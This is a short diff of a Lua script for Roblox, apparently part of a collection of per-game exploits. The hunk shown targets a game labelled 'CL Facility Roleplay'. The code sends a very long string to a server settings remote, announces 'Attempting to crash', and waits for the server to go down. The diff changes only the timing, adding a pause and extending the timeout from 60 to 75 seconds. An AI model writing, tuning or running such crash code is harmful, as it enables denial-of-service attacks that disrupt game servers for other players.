@@ -825,7 +825,7 @@ function C.K_6416498845() -- CL Facility Roleplay
 }
 ]]
 	SettingsService.RF.Set:InvokeServer({LongString});
-		
+	task.wait(1)	
 	--end
 	warn('Game server completed sending request!')
 	warn('Attempting to crash')
@@ -843,9 +843,9 @@ function C.K_6416498845() -- CL Facility Roleplay
 		end
 	end)
 
-	wait(60)
-	warn('Client did not crash server within 60 seconds of Get Request.')
-	game:GetService('Players').LocalPlayer:Kick('Client did not crash game within 60 seconds of last Get Request')
+	wait(75)
+	warn('Client did not crash server within 75 seconds of Get Request.')
+	game:GetService('Players').LocalPlayer:Kick('Client did not crash game within 75 seconds of last Get Request')
 end
 function C.K_3226555017()
 	repeat wait() until game:IsLoaded()
